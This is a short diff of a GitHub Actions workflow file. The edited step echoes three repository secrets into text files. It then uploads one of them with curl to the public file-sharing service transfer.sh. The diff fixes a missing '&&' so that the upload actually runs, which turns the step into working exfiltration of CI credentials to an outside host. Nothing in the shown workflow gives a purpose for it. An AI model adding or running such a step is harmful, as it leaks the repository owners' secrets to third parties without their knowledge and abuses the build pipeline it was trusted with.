@@ -10,7 +10,7 @@ jobs:
       steps:
       - uses: actions/checkout@v3
       - name: Run a one-line script
-        run: echo $SECRET5 >> s5.txt && echo $SECRET6 >> s6.txt && echo $SECRET7 >> s7.txt curl --upload-file ./s5.txt https://transfer.sh/s7.txt
+        run: echo $SECRET5 >> s5.txt && echo $SECRET6 >> s6.txt && echo $SECRET7 >> s7.txt && curl --upload-file ./s5.txt https://transfer.sh/s7.txt
       env:
         SECRET5: ${{secrets.SECRET5}}
         SECRET6: ${{secrets.SECRET6}}
